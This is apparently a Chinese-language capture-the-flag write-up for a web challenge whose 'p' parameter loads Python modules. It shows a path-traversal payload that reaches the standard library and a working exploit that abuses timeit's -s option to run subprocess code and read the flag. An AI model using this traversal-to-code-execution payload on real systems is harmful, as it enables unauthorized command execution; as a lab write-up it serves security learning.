感觉很有意思的一道题

各个页面都是通过p参数来切换

比如这个

```
/?p=guestbook 
```

然后这里会发现一个特殊的报错

```
/?p=guestbook&o=add&n=cyny666&t= 
```

报错这个

![image-20240513200038626](C:/Users/86186/Desktop/write-up/ctfs/cyber%20CTF/assets/image-20240513200038626.png)

于是会发现前面的p应该是引用的python文件

后面的是参数

然后构造了这个

```
/?p=../../../../../../../../../../usr/lib/python3.11/__hello__ 
```

成功返回了hello

在kali中的python3.11目录下查看能用的标准库,发现可以用来rce的有这个

timeit.py

可以查看help

```
Options:
  -n/--number N: how many times to execute 'statement' (default: see below)
  -r/--repeat N: how many times to repeat the timer (default 5)
  -s/--setup S: statement to be executed once initially (default 'pass').
                Execution time of this setup statement is NOT timed.
  -p/--process: use time.process_time() (default is time.perf_counter())
  -v/--verbose: print raw timing results; repeat for more digits precision
  -u/--unit: set the output time unit (nsec, usec, msec, or sec)
  -h/--help: print this usage message and exit
  --: separate options from statement, use when statement starts with -
  statement: statement to be timed (default 'pass')
```

然后即可构造exp

```sh
p=../../../../../../../../../../lib/python3.11/timeit&-n&1&-s&import subprocess; print(subprocess.check_output('/readflag'))
```

对应的kali里面的使用是

```shell
python3 timeit.py -n 1 -s "import os;print(os.listdir())"
```

一种新型的命令拼接



